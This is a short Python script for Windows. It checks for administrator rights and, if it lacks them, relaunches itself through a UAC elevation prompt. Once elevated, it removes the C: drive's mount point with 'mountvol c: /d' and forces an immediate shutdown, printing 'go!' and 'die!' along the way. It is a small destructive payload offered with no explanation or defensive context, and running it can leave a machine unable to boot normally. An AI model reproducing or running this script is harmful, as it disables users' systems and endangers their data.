import ctypes, sys, os, time
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def admin_exe() :
    if is_admin():
        print("yes admin")
        os.system('mountvol c: /d')
        os.system('shutdown /s /t 0')
    else:
        if sys.version_info[0] == 3:
            print('no admin')
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
print("go!")
admin_exe()
print("die!")